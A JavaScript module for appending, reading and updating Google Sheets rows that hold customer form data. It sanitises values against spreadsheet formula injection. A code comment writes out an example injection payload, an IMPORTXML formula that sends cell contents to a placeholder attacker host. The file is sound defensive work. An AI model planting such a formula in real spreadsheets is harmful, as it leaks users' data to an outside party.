const { getAccessToken } = require('./google-auth')

const SHEETS_SCOPE = 'https://www.googleapis.com/auth/spreadsheets'

// USER_ENTERED makes Sheets parse leading =/+/-/@ as a live formula. Row data here is
// customer-submitted (job-request/lead forms), so without this a description like
// =IMPORTXML("https://evil.example/leak?x="&A1,"//a") would execute the moment the
// sheet is opened. Prefixing with an apostrophe forces literal-text, the standard
// mitigation for CSV/spreadsheet formula injection — only applied to strings so real
// numeric values (e.g. ai_estimate_low) keep their native Sheets number type.
function sanitizeSheetValue(value) {
  if (typeof value !== 'string') return value
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value
}

function columnLetter(index) {
  let letter = ''
  let n = index + 1
  while (n > 0) {
    const rem = (n - 1) % 26
    letter = String.fromCharCode(65 + rem) + letter
    n = Math.floor((n - 1) / 26)
  }
  return letter
}

async function appendRow(sheetId, tab, headers, rowObject) {
  const accessToken = await getAccessToken([SHEETS_SCOPE])
  const range = encodeURIComponent(`'${tab.replace(/'/g, "''")}'!A:Z`)

  const response = await fetch(
    `https://sheets.googleapis.com/v4/spreadsheets/${sheetId}/values/${range}:append?valueInputOption=USER_ENTERED&insertDataOption=INSERT_ROWS`,
    {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${accessToken}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        majorDimension: 'ROWS',
        values: [headers.map(header => sanitizeSheetValue(rowObject[header] ?? ''))]
      })
    }
  )

  const payload = await response.json()

  if (!response.ok) {
    throw new Error(payload.error?.message || 'Failed to append row to Google Sheet')
  }

  return payload
}

// Reads all rows and maps them against the header row (row 1). Returns each
// data row tagged with its 1-indexed sheet row number so callers can target
// updates precisely without a separate lookup pass.
async function getRows(sheetId, tab) {
  const accessToken = await getAccessToken([SHEETS_SCOPE])
  const range = encodeURIComponent(`'${tab.replace(/'/g, "''")}'!A:Z`)

  const response = await fetch(
    `https://sheets.googleapis.com/v4/spreadsheets/${sheetId}/values/${range}`,
    { headers: { Authorization: `Bearer ${accessToken}` } }
  )

  const payload = await response.json()

  if (!response.ok) {
    throw new Error(payload.error?.message || 'Failed to read Google Sheet')
  }

  const [headerRow, ...dataRows] = payload.values || []
  if (!headerRow) return { headers: [], rows: [] }

  const rows = dataRows.map((row, i) => {
    const values = {}
    headerRow.forEach((header, colIndex) => {
      values[header] = row[colIndex] ?? ''
    })
    return { rowNumber: i + 2, values }
  })

  return { headers: headerRow, rows }
}

// Updates a subset of named columns on a single existing row.
async function updateRowCells(sheetId, tab, rowNumber, headers, updates) {
  const accessToken = await getAccessToken([SHEETS_SCOPE])
  const data = Object.entries(updates)
    .map(([header, value]) => {
      const colIndex = headers.indexOf(header)
      if (colIndex === -1) return null
      const range = `'${tab.replace(/'/g, "''")}'!${columnLetter(colIndex)}${rowNumber}`
      return { range, values: [[sanitizeSheetValue(value)]] }
    })
    .filter(Boolean)

  if (!data.length) return { updatedCells: 0 }

  const response = await fetch(
    `https://sheets.googleapis.com/v4/spreadsheets/${sheetId}/values:batchUpdate`,
    {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${accessToken}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ valueInputOption: 'USER_ENTERED', data })
    }
  )

  const payload = await response.json()

  if (!response.ok) {
    throw new Error(payload.error?.message || 'Failed to update Google Sheet row')
  }

  return payload
}

module.exports = { appendRow, getRows, updateRowCells, columnLetter }
